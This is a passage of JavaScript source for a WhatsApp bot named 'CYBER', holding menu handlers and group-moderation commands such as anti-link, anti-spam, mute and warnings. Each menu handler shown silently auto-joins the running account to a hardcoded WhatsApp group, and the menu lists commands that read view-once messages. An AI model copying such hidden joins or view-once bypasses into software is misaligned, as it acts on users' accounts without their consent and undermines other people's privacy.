│❖ ${prefix}settings
│❖ ${prefix}showanticallmsg
│❖ ${prefix}statusemoji
│❖ ${prefix}sudo
│❖ ${prefix}testanticallmsg
│❖ ${prefix}unban
│❖ ${prefix}unbanuser
│❖ ${prefix}unbanuser1
│❖ ${prefix}unblock
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'stickermenu':
case 'CYBERsticker': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐒𝐓𝐈𝐂𝐊𝐄𝐑* ◆━━┓
│❖ ${prefix}awoo
│❖ ${prefix}bite
│❖ ${prefix}blush
│❖ ${prefix}bonk
│❖ ${prefix}bully
│❖ ${prefix}cringe
│❖ ${prefix}cry
│❖ ${prefix}cuddle
│❖ ${prefix}dance
│❖ ${prefix}delstickercmd
│❖ ${prefix}glomp
│❖ ${prefix}handhold
│❖ ${prefix}happy
│❖ ${prefix}highfive
│❖ ${prefix}hug
│❖ ${prefix}kill
│❖ ${prefix}kiss
│❖ ${prefix}lick
│❖ ${prefix}nom
│❖ ${prefix}pat
│❖ ${prefix}poke
│❖ ${prefix}qc
│❖ ${prefix}s
│❖ ${prefix}setstickercmd
│❖ ${prefix}shinobu
│❖ ${prefix}slap
│❖ ${prefix}smile
│❖ ${prefix}smug
│❖ ${prefix}steal
│❖ ${prefix}sticker
│❖ ${prefix}stickercmds
│❖ ${prefix}stickerthf
│❖ ${prefix}stickerwm
│❖ ${prefix}take
│❖ ${prefix}tosticker
│❖ ${prefix}wave
│❖ ${prefix}wink
│❖ ${prefix}wm
│❖ ${prefix}yeet
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'toolmenu':
case 'CYBERtool': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐓𝐎𝐎𝐋𝐒* ◆━━┓
│❖ ${prefix}calculate
│❖ ${prefix}calculator
│❖ ${prefix}carimage
│❖ ${prefix}cartoonify
│❖ ${prefix}currency
│❖ ${prefix}currencies
│❖ ${prefix}define
│❖ ${prefix}dictionary
│❖ ${prefix}ffstalk
│❖ ${prefix}genpass
│❖ ${prefix}myip
│❖ ${prefix}npm
│❖ ${prefix}npmstalk
│❖ ${prefix}profile
│❖ ${prefix}profile-pictures
│❖ ${prefix}qrcode
│❖ ${prefix}readqr
│❖ ${prefix}readmore
│❖ ${prefix}removebg
│❖ ${prefix}remind
│❖ ${prefix}shorturl
│❖ ${prefix}styletext
│❖ ${prefix}tomp3
│❖ ${prefix}tomp4
│❖ ${prefix}toimg
│❖ ${prefix}tourl
│❖ ${prefix}translate
│❖ ${prefix}url
│❖ ${prefix}weather
│❖ ${prefix}weather2
│❖ ${prefix}weatherinfo
│❖ ${prefix}whois
│❖ ${prefix}wiki
│❖ ${prefix}wikipedia
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'voicemenu':
case 'CYBERvoice': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐕𝐎𝐈𝐂𝐄* ◆━━┓
│❖ ${prefix}bass
│❖ ${prefix}blown
│❖ ${prefix}deep
│❖ ${prefix}earrape
│❖ ${prefix}fast
│❖ ${prefix}fat
│❖ ${prefix}gtts
│❖ ${prefix}nightcore
│❖ ${prefix}reverse
│❖ ${prefix}robot
│❖ ${prefix}say
│❖ ${prefix}slow
│❖ ${prefix}smooth
│❖ ${prefix}squirrel
│❖ ${prefix}tts
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'othermenu':
case 'CYBERother': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐎𝐓𝐇𝐄𝐑* ◆━━┓
│❖ ${prefix}😭
│❖ ${prefix}account
│❖ ${prefix}alive
│❖ ${prefix}aza
│❖ ${prefix}buy-panel
│❖ ${prefix}cat
│❖ ${prefix}checkmail
│❖ ${prefix}checkmails
│❖ ${prefix}coffee
│❖ ${prefix}del
│❖ ${prefix}delete
│❖ ${prefix}delmail
│❖ ${prefix}delpair
│❖ ${prefix}deltemp
│❖ ${prefix}deltmp
│❖ ${prefix}deletemail
│❖ ${prefix}dog
│❖ ${prefix}download
│❖ ${prefix}fox
│❖ ${prefix}freebot
│❖ ${prefix}gellltbot
│❖ ${prefix}getpp
│❖ ${prefix}git
│❖ ${prefix}idch
│❖ ${prefix}inbox
│❖ ${prefix}jid
│❖ ${prefix}kopi
│❖ ${prefix}listpair
│❖ ${prefix}mode
│❖ ${prefix}newmail
│❖ ${prefix}nsbxmdmfw
│❖ ${prefix}owner
│❖ ${prefix}pair
│❖ ${prefix}panda
│❖ ${prefix}paptt
│❖ ${prefix}ping
│❖ ${prefix}poem
│❖ ${prefix}prog
│❖ ${prefix}progquote
│❖ ${prefix}random-girl
│❖ ${prefix}react-ch
│❖ ${prefix}react-channel
│❖ ${prefix}reactbcnch
│❖ ${prefix}reademail
│❖ ${prefix}readmail
│❖ ${prefix}readviewonce2
│❖ ${prefix}repo
│❖ ${prefix}runtime
│❖ ${prefix}save
│❖ ${prefix}speed
│❖ ${prefix}svt
│❖ ${prefix}tempmail
│❖ ${prefix}tempmail2
│❖ ${prefix}tempmail-inbox
│❖ ${prefix}test
│❖ ${prefix}tmpmail
│❖ ${prefix}vkfkk
│❖ ${prefix}vv
│❖ ${prefix}vv2
│❖ ${prefix}vvgh
${_senderAdultUnlocked ? '│❖ ' + prefix + 'xvideos\n│❖ ' + prefix + 'xvideodl\n│❖ ' + prefix + 'xvideosearch\n│❖ ' + prefix + 'xnxxsearch\n│❖ ' + prefix + 'xnxx' : '│🔒 *Locked Commands*\n│  Use .addkey to access these'}
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

// === Get Your Free Bot Command ===
case 'getbot':
case 'gellltbot':
case 'freebot': {
    let botInfo = 
`*CYBER — Bot Deployment*

Interested in deploying your own WhatsApp bot?
The process is simple and takes less than 2 minutes.

▸ Contact the owner to get connected.

▸ Your instance will be ready immediately.

Use *${prefix}CYBER* to see all menu.`;

    reply(botInfo);
}
break;
case 'test': {
  let botInfo =
'*CYBER ᴀʟᴡᴀʏs ᴛʜᴇʀᴇ ғᴏʀ ʏᴏᴜ 🚀🔥*'

  reply(botInfo);
}

break;

case 'groupjid':
case 'gid': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    reply(`📌 *Group JID:*\n\`${m.chat}\``);
}
break;

case 'invite':
case 'gclink': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    try {
        const code = await devtrust.groupInviteCode(m.chat);
        const link = `https://chat.whatsapp.com/${code}`;
        reply(`🔗 *Group Invite Link*\n\n${link}`);
    } catch (e) {
        reply(`❌ *Cannot get invite link*\n\nReason: This group may have "Only admins can send invite links" enabled.`);
    }
}
break;

// ======================[ 🔇 MUTE/UNMUTE COMMANDS - FIXED ]======================

case 'muteuser':
case 'mutemember': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender;
    if (!user) return reply("👤 *Mention user to mute*");
    
    if (user === m.sender) return reply("❌ *You cannot mute yourself*");
    
    if (isCreator && user === botNumber) return reply("❌ *Cannot mute the bot*");
    
    if (!global.muted) global.muted = {};
    if (!global.muted[m.chat]) global.muted[m.chat] = [];
    
    if (global.muted[m.chat].includes(user)) {
        return reply(`⚠️ *@${user.split('@')[0]} is already muted*\nUse .unmute to unmute`, [user]);
    }
    
    global.muted[m.chat].push(user);
    saveMutedData(global.muted);  // <-- ADD THIS LINE
    reply(`🔇 *@${user.split('@')[0]} has been muted*`, [user]);
}
break;

case 'unmuteuser':
case 'unmutemember': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender;
    if (!user) return reply("👤 *Mention user to unmute*");
    
    if (!global.muted) global.muted = {};
    if (!global.muted[m.chat]) global.muted[m.chat] = [];
    
    if (!global.muted[m.chat].includes(user)) {
        return reply(`⚠️ *@${user.split('@')[0]} is not muted*`, [user]);
    }
    
    global.muted[m.chat] = global.muted[m.chat].filter(jid => jid !== user);
    saveMutedData(global.muted);  // <-- ADD THIS LINE
    reply(`🔊 *@${user.split('@')[0]} has been unmuted*`, [user]);
}
break;

// ======================[ 🔗 ANTI-LINK ]======================
case 'antilink': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        // Check if this group has antilink settings
        const groupSettings = antilinkSettings[m.chat] || { enabled: false, action: 'delete' };
        const status = groupSettings.enabled ? 'ON ✅' : 'OFF ❌';
        const action = groupSettings.enabled ? groupSettings.action : '-';
        
        return reply(`🔗 *Anti-Link*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ ${prefix}antilink on - Enable (delete mode)\n` +
                     `▸ ${prefix}antilink delete - Enable delete mode\n` +
                     `▸ ${prefix}antilink kick - Enable kick mode\n` +
                     `▸ ${prefix}antilink off - Disable\n\n` +
                     `⚙️ *Status:* ${status}\n` +
                     `⚙️ *Action:* ${action}\n\n` +
                     `_When enabled, links will be ${groupSettings.action === 'kick' ? 'deleted and user kicked' : 'deleted'}_`);
    }
    
    // Handle ON command (default to delete mode)
    if (args[0].toLowerCase() === 'on') {
        antilinkSettings[m.chat] = { enabled: true, action: 'delete' };
        saveAntilinkSettings(antilinkSettings);
        reply(`✅ *Anti-Link enabled (Delete mode)*\nLinks will be deleted automatically.`);
    }
    // Handle DELETE mode
    else if (args[0].toLowerCase() === 'delete') {
        antilinkSettings[m.chat] = { enabled: true, action: 'delete' };
        saveAntilinkSettings(antilinkSettings);
        reply(`✅ *Anti-Link set to DELETE mode*\nLinks will be deleted.`);
    }
    // Handle KICK mode
    else if (args[0].toLowerCase() === 'kick') {
        antilinkSettings[m.chat] = { enabled: true, action: 'kick' };
        saveAntilinkSettings(antilinkSettings);
        reply(`✅ *Anti-Link set to KICK mode*\nUsers who post links will be kicked.`);
    }
    // Handle OFF
    else if (args[0].toLowerCase() === 'off') {
        if (antilinkSettings[m.chat]) {
            antilinkSettings[m.chat].enabled = false;
            saveAntilinkSettings(antilinkSettings);
            reply(`❌ *Anti-Link disabled for this group*`);
        } else {
            reply(`⚠️ *Anti-Link is already disabled*`);
        }
    }
    else {
        reply(`❌ *Invalid option. Use: on, delete, kick, or off*`);
    }
}
break;

// ======================[ 🔍 WHOIS ]======================
case 'whois':
case 'profile': {
    const user = m.mentionedJid[0] || m.quoted?.sender || m.sender;
    
    let pp;
    try {
        pp = await devtrust.profilePictureUrl(user, 'image');
    } catch {
        pp = 'https://files.catbox.moe/smv12k.jpeg';
    }
    
    let name = await devtrust.getName(user);
    let about = await devtrust.fetchStatus(user).catch(() => ({ status: 'No bio' }));
    
    await devtrust.sendMessage(m.chat, {
        image: { url: pp },
        caption: `👤 *User Profile*\n\n` +
                 `📛 *Name:* ${name}\n` +
                 `📱 *Number:* ${user.split('@')[0]}\n` +
                 `📝 *Bio:* ${about.status || 'No bio'}\n` +
                 `🆔 *JID:* ${user}`
    }, { quoted: m });
}
break;

// ======================[ 👥 TOTAL MEMBERS ]======================
case 'totalmembers':
case 'members': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const total = groupMetadata.participants.length;
    const admins = groupMetadata.participants.filter(p => p.admin).length;
    
    reply(`👥 *Group Members*\n\n` +
          `📊 *Total:* ${total}\n` +
          `👑 *Admins:* ${admins}\n` +
          `👤 *Members:* ${total - admins}`);
}
break;

// ======================[ 🔗 REVOKE LINK ]======================
case 'revoke':
case 'revokelink': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    await devtrust.groupRevokeInvite(m.chat);
    const code = await devtrust.groupInviteCode(m.chat);
    reply(`✅ *Group link reset*\n🔗 https://chat.whatsapp.com/${code}`);
}
break;


// ======================[ 🏷️ ANTI-TAG ]======================
case 'antitag': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
        return reply(`🏷️ *Anti-Tag*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antitag on - Enable (delete mode)\n` +
                     `▸ .antitag delete - Enable delete mode\n` +
                     `▸ .antitag kick - Enable kick mode\n` +
                     `▸ .antitag off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antitag", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Tag enabled (Delete mode)*\nMass tagging will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antitag", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Tag enabled (Kick mode)*\nUsers who mass tag will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Tag disabled*`);
    }
}
break;

// ======================[ 🚫 ANTI-SPAM ]======================
case 'antispam': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
        return reply(`🚫 *Anti-Spam*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antispam on - Enable (delete mode)\n` +
                     `▸ .antispam delete - Enable delete mode\n` +
                     `▸ .antispam kick - Enable kick mode\n` +
                     `▸ .antispam off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antispam", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Spam enabled (Delete mode)*\nSpam messages will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antispam", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Spam enabled (Kick mode)*\nUsers who spam will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Spam disabled*`);
    }
}
break;

// ======================[ 🤖 ANTI-BOT ]======================
case 'antibot': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
        return reply(`🤖 *Anti-Bot*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antibot on - Enable (delete mode)\n` +
                     `▸ .antibot delete - Enable delete mode\n` +
                     `▸ .antibot kick - Enable kick mode\n` +
                     `▸ .antibot off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antibot", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Bot enabled (Delete mode)*\nBot messages will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antibot", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Bot enabled (Kick mode)*\nBots will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Bot disabled*`);
    }
}
break;

// ======================[ 💰 ANTI-BEG ]======================
case 'antibeg': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    if (!args[0]) {
        const config = getSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
        return reply(`💰 *Anti-Beg (Nigerian Style)*\n\n` +
                     `📌 *Usage:*\n` +
                     `▸ .antibeg on - Enable (delete mode)\n` +
                     `▸ .antibeg delete - Enable delete mode\n` +
                     `▸ .antibeg kick - Enable kick mode\n` +
                     `▸ .antibeg off - Disable\n\n` +
                     `⚙️ *Status:* ${config.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
                     `⚙️ *Action:* ${config.enabled ? config.action : '-'}\n\n` +
                     `_Detects "send me money", "I dey suffer", etc_`);
    }
    
    if (args[0] === 'on' || args[0] === 'delete') {
        setSetting(m.chat, "antibeg", { enabled: true, action: 'delete' });
        reply(`✅ *Anti-Beg enabled (Delete mode)*\nBegging messages will be deleted`);
    }
    else if (args[0] === 'kick') {
        setSetting(m.chat, "antibeg", { enabled: true, action: 'kick' });
        reply(`✅ *Anti-Beg enabled (Kick mode)*\nUsers who beg will be kicked`);
    }
    else if (args[0] === 'off') {
        setSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
        reply(`❌ *Anti-Beg disabled*`);
    }
}
break;

// ======================[ ⚠️ WARN COMMANDS ]======================
case 'warns':
case 'checkwarns': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender || m.sender;
    const warnCount = global.warns?.[m.chat]?.[user] || 0;
    
    reply(`⚠️ *@${user.split('@')[0]} has ${warnCount}/3 warnings*`, [user]);
}
break;

case 'resetwarns': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    
    const user = m.mentionedJid[0] || m.quoted?.sender;
    if (!user) return reply("👤 *Mention user to reset warnings*");
    
    if (global.warns?.[m.chat]?.[user]) {
        delete global.warns[m.chat][user];
        reply(`✅ *Warnings reset for @${user.split('@')[0]}*`, [user]);
    } else {
        reply(`⚠️ *@${user.split('@')[0]} has no warnings*`, [user]);
    }
}
break;

case 'setname':
case 'setgcname': {
